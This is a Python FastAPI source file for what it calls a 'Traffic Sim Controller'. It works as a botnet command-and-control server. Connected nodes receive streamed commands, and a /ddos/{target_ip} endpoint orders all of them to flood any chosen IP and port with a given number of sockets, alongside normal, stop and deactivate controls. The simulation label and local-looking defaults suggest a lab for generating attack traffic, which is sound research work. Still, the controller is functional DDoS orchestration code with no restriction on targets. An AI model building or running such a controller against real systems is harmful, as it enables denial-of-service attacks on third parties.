import asyncio
import json

from fastapi import FastAPI
from fastapi.responses import StreamingResponse

app = FastAPI(title="Traffic Sim Controller")

# ip -> {"queue": asyncio.Queue, "status": str}
nodes: dict[str, dict] = {}


def _broadcast(event: dict, targets: list[str] | None = None):
    data = json.dumps(event)
    for ip, node in list(nodes.items()):
        if targets is None or ip in targets:
            node["queue"].put_nowait(data)


@app.get("/stream")
async def stream(node_ip: str):
    queue: asyncio.Queue = asyncio.Queue()
    nodes[node_ip] = {"queue": queue, "status": "idle"}
    print(f"[+] {node_ip} connected", flush=True)

    # Tell all nodes (including new one) the updated peer list
    _broadcast({"cmd": "peers", "peers": list(nodes.keys())})

    async def generate():
        try:
            while True:
                try:
                    data = await asyncio.wait_for(queue.get(), timeout=15)
                    yield f"data: {data}\n\n"
                except asyncio.TimeoutError:
                    yield ": ping\n\n"
        finally:
            nodes.pop(node_ip, None)
            print(f"[-] {node_ip} disconnected", flush=True)
            _broadcast({"cmd": "peers", "peers": list(nodes.keys())})

    return StreamingResponse(generate(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.post("/ddos/{target_ip}")
async def ddos_all(target_ip: str, num_sockets: int = 200, target_port: int = 8001):
    cmd = {"cmd": "attack", "target_ip": target_ip, "target_port": target_port, "num_sockets": num_sockets}
    _broadcast(cmd)
    for node in nodes.values():
        node["status"] = "attacking"
    return {ip: "ok" for ip in nodes}


@app.post("/normal")
async def normal_all():
    _broadcast({"cmd": "normal", "peers": list(nodes.keys())})
    for node in nodes.values():
        node["status"] = "normal"
    return {ip: "ok" for ip in nodes}


@app.post("/stop")
async def stop_all():
    _broadcast({"cmd": "stop"})
    for node in nodes.values():
        node["status"] = "idle"
    return {ip: "ok" for ip in nodes}


@app.post("/deactivate/{node_ip}")
async def deactivate(node_ip: str):
    if node_ip in nodes:
        nodes[node_ip]["queue"].put_nowait(json.dumps({"cmd": "stop"}))
        nodes[node_ip]["status"] = "deactivated"
    return {"ok": True}


@app.get("/status")
async def status():
    return {ip: {"status": n["status"]} for ip, n in nodes.items()}


@app.get("/health")
async def health():
    return {"ok": True}
